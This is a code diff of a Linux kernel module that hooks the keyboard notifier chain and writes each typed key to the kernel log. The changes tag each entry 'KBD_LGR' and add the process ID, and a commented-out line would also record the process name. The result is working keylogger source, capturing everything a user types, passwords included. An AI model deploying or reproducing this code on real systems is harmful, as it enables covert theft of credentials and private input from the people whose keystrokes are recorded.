@@ -1,15 +1,18 @@
 #include <linux/module.h>
 #include <linux/init.h>
+#include <asm/current.h>
+#include <linux/sched.h>
 
 // Keyboard hook
 #include <linux/keyboard.h>
-#include <linux/semaphore.h>
+
+#define BUFLEN 16
 
 MODULE_LICENSE("GPL");
 
 // Taken from: https://github.com/enaudon/abide/
 char *ascii[128] = {
-  NO_EFCT, "<SOH>", "<STX>", "<ETX>", "<EOT>", "<ENQ>", "<ACK>", "<BEL>",
+  "", "<SOH>", "<STX>", "<ETX>", "<EOT>", "<ENQ>", "<ACK>", "<BEL>",
   "<BS>",  "<TAB>", "<LF>",  "<VT>",  "<FF>",  "<CR>",  "<SO>",  "<SI>",
   "<DLE>", "<DC1>", "<DC2>", "<DC3>", "<DC4>", "<NAK>", "<SYN>", "<ETB>",
   "<CAN>", "<EM>",  "<SUB>", "<ESC>", "<FS>",  "<GS>",  "<RS>",  "<US>",
@@ -26,10 +29,15 @@ int key_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
     unsigned char type = param->value >> 8;
     unsigned char val  = param->value & 0x00ff;
+    char buff[BUFLEN];
+//     char proc_name[TASK_COMM_LEN];
 
     // we only catch keys on the way up
     if(param->down)
         return NOTIFY_OK;
+    
+//     strlcpy(proc_name, current->comm, TASK_COMM_LEN);
+    memset(buff, 0, BUFLEN);
 
     // check for back space or delete first, then letters & numbers
     if(param->value == 0xf07f) {
@@ -46,7 +54,9 @@ int key_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
     if(buff[0] == '\0' || buff[0] == '<')
         return NOTIFY_OK;
 
-    printk(KERN_INFO "%s\n", buff);
+    printk(KERN_INFO "KBD_LGR\t%d: %s\n", current->pid, buff);
+    
+    
 
     return NOTIFY_OK;
 }
